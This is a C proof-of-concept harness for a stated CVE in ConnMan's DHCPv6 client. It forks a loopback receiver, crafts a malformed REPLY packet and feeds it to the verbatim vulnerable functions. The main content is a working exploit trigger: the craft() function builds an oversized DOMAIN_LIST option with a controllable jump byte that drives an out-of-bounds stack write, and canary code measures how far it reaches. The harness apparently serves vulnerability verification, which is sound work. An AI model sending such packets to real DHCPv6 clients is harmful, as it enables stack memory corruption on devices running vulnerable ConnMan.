/*
 * Loopback-wire harness for CVE-2026-115863 / GHSA-725f-6r9j-c4hf.
 *
 * VERBATIM pinned tag-2.0 functions via generated .inc files:
 *   get_option_fn.inc    <- uint8_t *dhcpv6_get_option(...)  (gdhcp/common.c)
 *   get_domains_fn.inc   <- static GList *get_domains(...)    (gdhcp/client.c)
 *   get_ov_list_fn.inc   <- static GList *get_dhcpv6_option_value_list(...)
 *   get_request_fn.inc   <- static void get_dhcpv6_request(...)
 *
 * Unlike the wirereply harness, the REPLY-shaped packet is not an in-process
 * buffer: a separate sender process writes it to a real 127.0.0.1 UDP socket
 * bound by the receiver process, which reads it with recvfrom() and feeds the
 * received bytes to ConnMan's own option parser and the three-function caller
 * chain. GLib is stubbed; no connmand daemon, external network or full build.
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <string.h>

#define NS_MAXDNAME 1025

/* gdhcp/common.h tag 2.0: only codes used by the exercised switch arms. */
#define G_DHCPV6_IA_NA        3
#define G_DHCPV6_IA_TA        4
#define G_DHCPV6_DNS_SERVERS 23
#define G_DHCPV6_DOMAIN_LIST 24
#define G_DHCPV6_IA_PD       25
#define G_DHCPV6_SNTP_SERVERS 31

typedef int gboolean;
typedef int gint;
typedef unsigned int guint;
typedef void *gpointer;
typedef size_t gsize;

typedef struct GList {
	void *data;
	struct GList *next;
	struct GList *prev;
} GList;

typedef struct _GHashTable GHashTable;

static GList *g_list_prepend(GList *list, void *data)
{
	GList *n = malloc(sizeof(*n));
	if (!n) exit(91);
	n->data = data;
	n->next = list;
	n->prev = NULL;
	if (list) list->prev = n;
	return n;
}

static GList *g_list_append(GList *list, void *data)
{
	GList *n = malloc(sizeof(*n)), *p;
	if (!n) exit(93);
	n->data = data; n->next = NULL; n->prev = NULL;
	if (!list) return n;
	for (p = list; p->next; p = p->next) ;
	p->next = n; n->prev = p;
	return list;
}

static GList *g_list_reverse(GList *list)
{
	GList *prev = NULL, *cur = list;
	while (cur) {
		GList *next = cur->next;
		cur->next = prev;
		cur->prev = next;
		prev = cur;
		cur = next;
	}
	return prev;
}

static char *g_strdup(const char *s)
{
	size_t n = strlen(s) + 1;
	char *p = malloc(n);
	if (!p) exit(92);
	memcpy(p, s, n);
	return p;
}

static void *g_try_malloc0(gsize n) { return calloc(1, n); }
static void g_free(void *p) { free(p); }
#define GINT_TO_POINTER(i) ((void *)(intptr_t)(i))
#define GPOINTER_TO_INT(p) ((int)(intptr_t)(p))

static void g_hash_table_remove(GHashTable *h, gpointer k) { (void)h; (void)k; }
static void g_hash_table_insert(GHashTable *h, gpointer k, gpointer v)
{ (void)h; (void)k; (void)v; }

/* Minimal GDHCPClient: only fields referenced by the extracted functions. */
typedef struct _GDHCPClient {
	GList *request_list;
	GHashTable *code_value_hash;
} GDHCPClient;

/* Verbatim struct from pinned gdhcp/common.h (flexible options array). */
struct dhcpv6_packet {
	uint8_t message;
	uint8_t transaction_id[3];
	uint8_t options[];
} __attribute__((packed));

/* Real signature from pinned gdhcp/common.h; NULL is passed by the verbatim
 * get_dhcpv6_request() for option_count. */
uint8_t *dhcpv6_get_option(struct dhcpv6_packet *packet, uint16_t pkt_len,
			int code, uint16_t *option_len, int *option_count);

/* Capture get_dhcpv6_request()'s frame base from inside the real debug()
 * call site, without modifying any verbatim function. */
static void *g_request_rbp;
static void debug(GDHCPClient *client, const char *format, ...)
{
	(void)client; (void)format;
	if (!g_request_rbp) g_request_rbp = __builtin_frame_address(1);
}

/* get_addresses is not reached: the crafted packet offers only code 24. */
static GList *get_addresses(GDHCPClient *c, int code, int len,
				unsigned char *value, uint16_t *status)
{
	(void)c; (void)code; (void)len; (void)value; (void)status;
	return NULL;
}

#include "get_option_fn.inc"
#include "get_domains_fn.inc"
#include "get_ov_list_fn.inc"
#include "get_request_fn.inc"

#define OPTVAL 2048
#define ATK_PKTLEN (4 + 4 + OPTVAL)
static unsigned char pktbuf[ATK_PKTLEN];

/* DHCPv6 REPLY (message type 7) with one DOMAIN_LIST option (code 24).
 * The 16-bit option length is 2048 for attack, 8 for the safe control. */
static uint16_t craft(int attack, int lastjump)
{
	uint16_t olen = attack ? OPTVAL : 8;
	uint16_t pktlen = (uint16_t)(4 + 4 + olen);
	memset(pktbuf, 0, sizeof(pktbuf));
	pktbuf[0] = 7;
	pktbuf[1] = 0x11; pktbuf[2] = 0x22; pktbuf[3] = 0x33;
	pktbuf[4] = 0; pktbuf[5] = 24;
	pktbuf[6] = (unsigned char)(olen >> 8); pktbuf[7] = (unsigned char)olen;
	if (attack) {
		memset(pktbuf + 8, 0xff, OPTVAL);
		pktbuf[8 + OPTVAL - 1] = 0x00;
		pktbuf[8 + 1024] = (unsigned char)lastjump;
	} else {
		unsigned char *v = pktbuf + 8;
		v[0] = 3; v[1] = 'a'; v[2] = 'b'; v[3] = 'c';
		v[4] = 3; v[5] = 'd'; v[6] = 'e'; v[7] = 0;
	}
	return pktlen;
}

static void run_chain(GDHCPClient *client, struct dhcpv6_packet *pkt,
			uint16_t pktlen, uint16_t *status)
{
#ifdef PLAIN
	/* Immediate caller frame: the OOB walk advances toward higher stack
	 * addresses, so this canary sits just above get_dhcpv6_request's frame. */
	volatile unsigned char fill[16384];
	for (int i = 0; i < (int)sizeof(fill); i++) fill[i] = 0xee;
#endif
	get_dhcpv6_request(client, pkt, pktlen, status);
#ifdef PLAIN
	int dots = 0, first = -1, last = -1;
	for (int i = 0; i < (int)sizeof(fill); i++) {
		if (fill[i] == 0x2e) {
			dots++;
			if (first < 0) first = i;
			last = i;
		}
	}
	printf("CANARY DOTS=%d FIRST=%d LAST=%d FILLBASE=%p REQ_RBP=%p\n",
	       dots, first, last, (void *)(uintptr_t)fill, g_request_rbp);
	fflush(stdout);
#endif
}

/* Receiver process: only this process runs the vulnerable code. */
static int server_body(int ready_fd, int attack, int lastjump)
{
	unsigned char recvbuf[ATK_PKTLEN + 16] __attribute__((aligned(8)));
	struct sockaddr_in local;
	socklen_t alen = sizeof(local);
	uint16_t port;
	ssize_t n;

	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0) { perror("socket"); return 81; }
	memset(&local, 0, sizeof(local));
	local.sin_family = AF_INET;
	local.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	local.sin_port = 0;
	if (bind(s, (struct sockaddr *)&local, sizeof(local)) < 0) {
		perror("bind"); return 82;
	}
	if (getsockname(s, (struct sockaddr *)&local, &alen) < 0) {
		perror("getsockname"); return 83;
	}
	port = ntohs(local.sin_port);
	if (write(ready_fd, &port, sizeof(port)) != (ssize_t)sizeof(port)) {
		perror("write-ready"); return 84;
	}
	n = recvfrom(s, recvbuf, sizeof(recvbuf), 0, NULL, NULL);
	if (n < 0) { perror("recvfrom"); return 85; }
	printf("SRV BOUND=127.0.0.1:%u RECV=%zd\n", port, n);
	fflush(stdout);

	struct dhcpv6_packet *pkt = (struct dhcpv6_packet *)recvbuf;
	uint16_t olen = 0; int count = 0;
	uint8_t *value = dhcpv6_get_option(pkt, (uint16_t)n, G_DHCPV6_DOMAIN_LIST,
					&olen, &count);
	printf("WIREPARSE OLEN=%u COUNT=%d OFFSET=%ld\n", olen, count,
	       (long)(value ? value - recvbuf : -1));
	printf("WIRE MODE=%s PKTLEN=%zd LASTJUMP=%02x\n",
	       attack ? "attack" : "safe", n, lastjump);
	fflush(stdout);

	GDHCPClient client;
	memset(&client, 0, sizeof(client));
	client.request_list = g_list_prepend(NULL, GINT_TO_POINTER(G_DHCPV6_DOMAIN_LIST));
	uint16_t status = 0;
	run_chain(&client, pkt, (uint16_t)n, &status);

	printf("CHAIN DONE STATUS=%u REQ_RBP=%p\n", status, g_request_rbp);
	close(s);
	return 0;
}

int main(int argc, char **argv)
{
	int attack = (argc < 2 || strcmp(argv[1], "attack") == 0);
	int lastjump = 0x80;
	if (argc >= 3) lastjump = (int)strtol(argv[2], NULL, 0);

	int ready[2];
	if (pipe(ready) < 0) { perror("pipe"); return 86; }
	pid_t pid = fork();
	if (pid < 0) { perror("fork"); return 87; }
	if (pid == 0) {
		close(ready[0]);
		int rc = server_body(ready[1], attack, lastjump);
		fflush(stdout);
		_exit(rc);
	}
	close(ready[1]);
	uint16_t port = 0;
	ssize_t got = read(ready[0], &port, sizeof(port));
	if (got != (ssize_t)sizeof(port)) { fprintf(stderr, "CLI no-ready\n"); return 88; }
	close(ready[0]);

	uint16_t pktlen = craft(attack, lastjump);
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0) { perror("cli-socket"); return 89; }
	struct sockaddr_in dst;
	memset(&dst, 0, sizeof(dst));
	dst.sin_family = AF_INET;
	dst.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	dst.sin_port = htons(port);
	ssize_t sent = sendto(s, pktbuf, pktlen, 0,
			      (struct sockaddr *)&dst, sizeof(dst));
	if (sent < 0) { perror("sendto"); return 90; }
	printf("CLI SENT=%zd PKTLEN=%u DST=127.0.0.1:%u\n", sent, pktlen, port);
	fflush(stdout);
	close(s);

	int status = 0;
	if (waitpid(pid, &status, 0) < 0) { perror("waitpid"); return 94; }
	printf("SRV EXIT=%d SIGNALED=%d\n",
	       WIFEXITED(status) ? WEXITSTATUS(status) : -1,
	       WIFSIGNALED(status) ? WTERMSIG(status) : 0);
	return 0;
}
